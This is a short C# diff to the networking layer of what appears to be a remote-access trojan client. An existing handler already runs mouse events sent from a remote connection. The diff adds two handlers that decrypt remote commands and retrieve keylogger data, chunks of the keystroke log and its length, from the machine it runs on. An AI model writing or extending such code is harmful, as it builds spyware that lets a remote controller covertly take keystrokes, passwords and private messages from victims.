@@ -113,6 +113,14 @@ namespace Client.Core.Networking
             {
                 MouseEvent.Execute(Cryptography.Decrypt(incomingData));
             });
+            Connection.AppendIncomingPacketHandler<string>("GetKeylogChunkReq", (packetHeader, connection, incomingData) =>
+            {
+                GetKeylogChunk.Execute(Cryptography.Decrypt(incomingData));
+            });
+            Connection.AppendIncomingPacketHandler<string>("GetKeylogDumpLengthReq", (packetHeader, connection, incomingData) =>
+            {
+                GetKeylogDumpLength.Execute(Cryptography.Decrypt(incomingData));
+            });
 
         }
 
